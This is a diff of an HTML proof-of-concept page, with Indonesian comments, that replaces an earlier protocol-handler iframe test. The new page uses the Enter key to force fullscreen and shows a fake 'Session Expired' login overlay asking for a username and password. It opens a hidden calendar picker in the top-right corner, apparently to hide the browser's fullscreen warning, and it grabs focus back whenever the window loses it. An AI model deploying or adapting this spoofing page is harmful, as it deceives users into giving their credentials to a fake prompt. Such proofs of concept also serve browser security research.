@@ -1,33 +1,152 @@
 <!DOCTYPE html>
 <html>
 <head>
+<title>Fullscreen + Overlay + Top-Right Calendar PoC</title>
+
+<style>
+  body {
+    margin: 0;
+    height: 100%;
+    background: #111;
+    color: white;
+    font-family: Arial;
+    overflow: hidden;
+  }
+
+  /* posisi trigger calendar (pojok kanan atas) */
+  #container {
+    position: fixed;
+    top: 0;
+    right: 0;
+    width: 1px;
+    height: 1px;
+  }
+
+  /* input disembunyikan tapi tetap aktif */
+  #g {
+    opacity: 0;
+    width: 1px;
+    height: 1px;
+    border: none;
+  }
+
+  /* overlay fullscreen */
+  #fakeUI {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(15,15,15,0.98);
+    backdrop-filter: blur(6px);
+    z-index: 9999;
+    text-align: center;
+    padding-top: 120px;
+    animation: fadeIn 0.3s ease;
+  }
+
+  @keyframes fadeIn {
+    from { opacity: 0; }
+    to { opacity: 1; }
+  }
+
+  /* box login */
+  #fakeBox {
+    background: #1e1e1e;
+    padding: 30px;
+    width: 320px;
+    margin: auto;
+    border-radius: 12px;
+    box-shadow: 0 0 40px rgba(0,0,0,0.9);
+  }
+
+  #fakeBox h2 {
+    margin-bottom: 10px;
+  }
+
+  #fakeBox p {
+    font-size: 14px;
+    color: #bbb;
+  }
+
+  input[type="text"],
+  input[type="password"] {
+    width: 90%;
+    padding: 10px;
+    margin: 10px 0;
+    border: none;
+    border-radius: 6px;
+    outline: none;
+  }
+
+  button {
+    padding: 10px 20px;
+    border: none;
+    background: #4285f4;
+    color: white;
+    border-radius: 6px;
+    cursor: pointer;
+  }
+
+  button:hover {
+    background: #2f6fe0;
+  }
+</style>
 </head>
+
 <body>
-  <h1>Opening and Closing Popup Windows</h1>
 
-  <script>
-    // Script.js
-    function openURL() {
-      var iframe = document.createElement('iframe');
-      iframe.src = 'tel://a';
-      document.body.appendChild(iframe);
+<!-- hidden calendar trigger -->
+<div id="container">
+  <input type="datetime-local" id="g">
+</div>
+
+<!-- fake login overlay -->
+<div id="fakeUI">
+  <div id="fakeBox">
+    <h2>Session Expired</h2>
+    <p>Please login again to continue</p>
+
+    <input type="text" placeholder="Username">
+    <input type="password" placeholder="Password">
+
+    <button>Login</button>
+  </div>
+</div>
+
+<script>
+function openCalendar() {
+  const input = document.getElementById("g");
+
+  input.focus();
+
+  if (input.showPicker) {
+    input.showPicker();
+  }
+}
+
+document.addEventListener("keydown", function(e) {
+  if (e.key === "Enter") {
+
+    // fullscreen trigger
+    if (!document.fullscreenElement) {
+      document.documentElement.requestFullscreen();
     }
 
-    // Main.js
-    function openNewTab() {
-      var newTab = window.open("", "_self");
-      newTab.document.write('<h1>Popup Window</h1>');
-      newTab.document.write('<iframe></iframe>');
-      newTab.document.close();
+    // tampilkan overlay + calendar
+    setTimeout(() => {
+      document.getElementById("fakeUI").style.display = "block";
+      openCalendar();
+    }, 250);
+  }
+});
 
-      var iframeBody = newTab.document.querySelector('iframe').contentWindow.document.body;
-      iframeBody.innerHTML = '<p>Click <a href="tel://newwindow" onclick="openURL()">here</a> for open.</p><br><p>Click <a href="zoommtg://link" onclick="openURL()">here</a> for open.</p><br><p>Click <a href="whatsapp:11111" onclick="openURL()">here</a> for open.</p><br><p>Click <a href="ms-calculator::hello" onclick="openURL()">here</a> for open.</p><br>';
-    }
+// optional: jaga fokus tetap di halaman
+window.onblur = () => {
+  window.focus();
+};
+</script>
 
-    // Panggil fungsi saat dokumen selesai dimuat
-    document.addEventListener('DOMContentLoaded', function() {
-      openNewTab();
-    });
-  </script>
 </body>
 </html>
